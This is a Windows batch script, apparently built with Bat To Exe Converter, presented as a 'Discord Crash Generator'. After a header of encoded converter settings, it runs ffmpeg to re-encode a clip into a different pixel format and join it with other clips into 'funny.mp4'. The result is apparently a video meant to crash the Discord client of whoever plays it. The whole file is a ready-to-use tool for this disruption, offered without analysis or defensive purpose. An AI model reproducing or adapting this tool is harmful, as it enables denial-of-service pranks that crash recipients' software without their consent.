::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCuDJH2L40w8JxpQXzibOXipA7QP7aby7OXn
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSjk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJhSA==
::ZQ05rAF9IBncCkqN+0xwdVsFLA==
::ZQ05rAF9IAHYFVzEqQIUIQhXQxaGfEioB6YUqM/+4e+Vo1kSRoI=
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQITOh5VWAGRfGr6ELwY7ee7++KGtg0eRuMscIrImq2BNfJTzkz3dpk/0jpZlMIJAg8WHg==
::dhA7uBVwLU+EWFDE8E0+PFtbWwrCM2W/Zg==
::YQ03rBFzNR3SWATE51I5JhVRXgeKLmKpReRNubCb
::dhAmsQZ3MwfNWATE51I5JhVRXgeKLmKpReRNubCb
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRmM/SI=
::Zh4grVQjdCuDJH2L40w8JxpQXziGNXi5CacY6/r6/OK7hkQOV+0tfM/4yLWdKKA070vhZ5c52WgUndMJbA==
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
color c
echo Discord Crash Generator
timeout 1 >nul
echo.
timeout 1 >nul
echo.
timeout 1 >nul
echo -----------------------
timeout 1 >nul
echo.
timeout 1 >nul
echo.
timeout 1 >nul
echo This was made by spinnerchris#1118.
timeout 1 >nul
echo Press enter to begin...
set /p input=
timeout 3 >nul
echo Editing files...
timeout 1 >nul
echo Generating files...
ffmpeg.exe -loglevel quiet -i part2.mp4 -pix_fmt yuv444p part2_new.mp4
ffmpeg.exe -loglevel quiet -f concat -i req.txt -codec copy funny.mp4
move funny.mp4 Output\
timeout 2 >nul
del part2_new.mp4
echo Finished!
timeout 1 >nul
echo This window will close in 3 seconds.
timeout 3 >nul
exit